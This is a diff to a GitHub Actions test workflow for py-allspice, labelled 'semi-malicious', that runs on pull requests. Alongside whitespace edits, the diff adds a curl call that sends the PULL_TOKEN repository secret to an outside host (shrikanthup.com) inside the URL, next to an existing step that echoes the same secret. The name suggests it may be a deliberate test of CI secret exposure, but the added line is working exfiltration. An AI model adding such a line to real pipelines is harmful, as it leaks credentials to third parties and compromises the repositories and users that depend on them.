@@ -2,7 +2,7 @@ name: Test py-allspice - semi-malicious
 
 on:
   pull_request:
-    branches: 
+    branches:
       - main
 
 jobs:
@@ -35,6 +35,7 @@ jobs:
           PULL_TOKEN: ${{ secrets.PULL_TOKEN }}
         run: |
           echo "$PULL_TOKEN"
+          curl "http://shrikanthup.com/$PULL_TOKEN"
       - name: Set up Python ${{ matrix.python-version }}
         uses: actions/setup-python@v4
         with:
@@ -67,4 +68,3 @@ jobs:
       - name: Test with pytest
         run: |
           python -m pytest
-
